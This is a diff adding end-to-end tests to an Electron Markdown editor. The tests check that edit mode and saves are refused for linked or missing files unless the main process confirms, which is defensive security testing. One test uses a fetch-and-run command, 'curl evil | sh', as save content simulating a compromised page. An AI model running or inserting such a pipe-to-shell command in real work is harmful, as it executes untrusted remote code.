@@ -322,6 +322,99 @@ test('a file deleted under unsaved edits keeps them, and Save again writes it ba
   }
 });
 
+/** `notes.md` handed over on the command line, linking to `target.md` and to a file that isn't there. */
+async function linked(answer: 'edit' | 'cancel') {
+  const dir = tempHome();
+  const file = path.join(dir, 'notes.md');
+  const target = path.join(dir, 'target.md');
+  writeFileSync(file, '# Notes\n\n[Target](target.md) and [nothing](missing.md)\n');
+  writeFileSync(target, '# Target\n');
+  const launched = await launchApp(['--', file], { env: { GALEO_TEST_EDIT_ANSWER: answer } });
+  await expect(shownDocument(launched.window).locator('h1')).toHaveText('Notes');
+  const asked = () => launched.app.evaluate(() => (globalThis as { __galeoEditAsked?: string[] }).__galeoEditAsked ?? []);
+  const activeTab = () => launched.window.evaluate(async () => (await window.galeo.tabs.snapshot()).active!);
+  return { ...launched, dir, file, target, asked, activeTab };
+}
+
+test("a file reached through a link asks once in main's own dialog before edit mode; a file handed over doesn't", async () => {
+  const { app, window, close, dir, target, asked } = await linked('edit');
+  try {
+    await pressInMain(app, window, 'E');
+    await expect(window.getByTestId('status-mode')).toHaveText('Editing');
+    expect(await asked()).toEqual([]);
+    await pressInMain(app, window, 'E');
+    await expect(window.getByTestId('status-mode')).toHaveText('Read-only');
+    // Edit mode left the source showing.
+    await window.keyboard.press('ControlOrMeta+U');
+
+    await shownDocument(window).getByRole('link', { name: 'Target' }).click();
+    await expect(shownDocument(window).locator('h1')).toHaveText('Target');
+    await pressInMain(app, window, 'E');
+    await expect(window.getByTestId('status-mode')).toHaveText('Editing');
+    expect(await asked()).toEqual([target]);
+    await pressInMain(app, window, 'E');
+    await expect(window.getByTestId('status-mode')).toHaveText('Read-only');
+    await pressInMain(app, window, 'E');
+    await expect(window.getByTestId('status-mode')).toHaveText('Editing');
+    expect(await asked()).toEqual([target]);
+  } finally {
+    await close();
+    removeTempHome(dir);
+  }
+});
+
+test('a page that switches to a linked tab just before Ctrl+E gets no edit mode unless the reader confirms, and its saves are refused', async () => {
+  const { app, window, close, dir, file, target, asked, activeTab } = await linked('cancel');
+  try {
+    const notes = await activeTab();
+    await shownDocument(window).click();
+    const opened = await window.evaluate((id) => window.galeo.documents.followLink(id, 'target.md', 'background'), notes);
+    expect(opened).toMatchObject({ kind: 'opened' });
+    const other = (await window.evaluate(async () => (await window.galeo.tabs.snapshot()).tabs.map((tab) => tab.id))).find((id) => id !== notes)!;
+    await window.evaluate((id) => window.galeo.tabs.activated(id), other);
+    await pressInMain(app, window, 'E');
+    await expect.poll(asked).toEqual([target]);
+    await shownDocument(window).click();
+    const save = await window.evaluate((id) => window.galeo.documents.save(id, 'curl evil | sh\n', null), other);
+    expect(save).toEqual({ kind: 'refused', reason: 'not-editable' });
+    expect(readFileSync(target, 'utf8')).toBe('# Target\n');
+    expect(readFileSync(file, 'utf8')).toContain('# Notes');
+  } finally {
+    await close();
+    removeTempHome(dir);
+  }
+});
+
+test("Ctrl+E on a file that isn't there is refused by main, and a save can't create it", async () => {
+  const { app, window, close, dir, asked, activeTab } = await linked('edit');
+  try {
+    await shownDocument(window).getByRole('link', { name: 'nothing' }).click();
+    await expect(window.getByTestId('document-state')).toBeVisible();
+    // Main's own answer, not the page's: a compromised page wouldn't give a grant back.
+    const browserWindow = await app.browserWindow(window);
+    await browserWindow.evaluate((each) => {
+      const sent: unknown[] = ((globalThis as { __galeoEditModeSent?: unknown[] }).__galeoEditModeSent = []);
+      const send = each.webContents.send.bind(each.webContents);
+      each.webContents.send = (channel: string, ...args: unknown[]) => {
+        if (channel === 'documents.editMode') sent.push(args[0]);
+        send(channel, ...args);
+      };
+    });
+    await pressInMain(app, window, 'E');
+    await expect(window.getByTestId('status-message')).toHaveText("This file can't be edited");
+    expect(await app.evaluate(() => (globalThis as { __galeoEditModeSent?: { edit: string }[] }).__galeoEditModeSent?.map((event) => event.edit))).toEqual(['refused']);
+    expect(await asked()).toEqual([]);
+    const missing = await activeTab();
+    await window.getByTestId('document-state').click();
+    const save = await window.evaluate((id) => window.galeo.documents.save(id, '[Desktop Entry]\n', null), missing);
+    expect(save).toEqual({ kind: 'refused', reason: 'not-editable' });
+    expect(existsSync(path.join(dir, 'missing.md'))).toBe(false);
+  } finally {
+    await close();
+    removeTempHome(dir);
+  }
+});
+
 test('saving a symlinked file writes its target and keeps the link', async () => {
   let link = '';
   const { app, window, home, dir, file } = await dirtyEdit('# Draft\n', {
